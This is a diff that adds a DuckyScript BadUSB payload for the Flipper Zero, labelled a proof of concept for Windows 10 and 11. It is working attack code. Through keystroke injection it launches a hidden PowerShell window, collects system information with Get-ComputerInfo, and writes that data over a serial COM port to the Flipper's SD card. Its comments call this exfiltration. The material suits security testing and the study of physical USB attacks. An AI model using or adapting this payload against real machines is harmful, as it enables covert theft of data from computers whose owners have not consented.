@@ -1,0 +1,73 @@
+REM Title: Save To Flipper (no altstring)
+REM Author: emptythevoid and LupusE
+REM Target: Windows 10, Windows 11
+REM Version: 1.1
+REM Category: PoC
+
+REM The Device IDs (defaults are HID\\VID_046D\&PID_C529  USB\\VID_0483\&PID_5740  )
+REM The Baud rate (default is 230400)
+
+REM Open Powershell
+DELAY 500
+GUI r
+DELAY 500
+
+REM Run Powershell by full path to avoid Windows Terminal. Launch hidden.
+STRING %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -w h
+
+DELAY 500
+ENTER
+DELAY 750
+
+REM Once payload is deployed and the Flipper is backed out to normal mode, the script will determine which COM port the Flipper is plugged in to by searching for the USB ID. It will then write the output (string) of the executed command to the specified path and file on the Flipper's SD card.
+
+REM ## Command to execute/data to exfiltrate. Don't forget cast to string. 
+STRING $d=(Get-ComputerInfo|Out-String);
+
+REM ## The VendorID and ProductID to Match. If you'd change the BadUSB IDs in the BadKB app or in this script, you need to change these values to match. Otherwise Powershell won't detect the Flipper when it returns to normal mode.
+STRING $BHID="HID\\VID_046D\&PID_C529";
+STRING $SUSB="USB\\VID_0483\&PID_5740";
+
+REM ## The path on the Flipper's SD card to store the exfliltrated data
+STRING $SPATH="/ext/apps_data/exfil_data"
+ENTER
+
+REM ## Perform 600 loops, to check if BadUSB is still active, wait 1 sec. If the Flipper is just disconnected, the loop will wait 4 sec.
+
+STRING 1..600|%{Try{$p=New-Object System.IO.Ports.SerialPort("COM$(((Get-PNPDevice -PresentOnly|Where{$_.InstanceID -match $SUSB -and $_.Class -eq "Ports"}) -split "COM")[1][0])",230400,'None',8,'one');$p.open();$p.Write("storage write $SPATH `r`n");$p.Write($d);$p.Write("$([char] 3)");$p.Close();exit}Catch{Sleep 1}}
+
+ENTER
+
+REM Flash Capslock to indicate when to back out of BadUSB mode
+CAPSLOCK
+DELAY 100
+CAPSLOCK
+DELAY 100
+CAPSLOCK
+DELAY 100
+CAPSLOCK
+DELAY 100
+CAPSLOCK
+DELAY 100
+CAPSLOCK
+DELAY 100
+CAPSLOCK
+DELAY 100
+CAPSLOCK
+DELAY 100
+CAPSLOCK
+DELAY 100
+CAPSLOCK
+DELAY 100
+CAPSLOCK
+DELAY 100
+CAPSLOCK
+DELAY 100
+CAPSLOCK
+DELAY 100
+CAPSLOCK
+DELAY 100
+CAPSLOCK
+DELAY 100
+CAPSLOCK
+
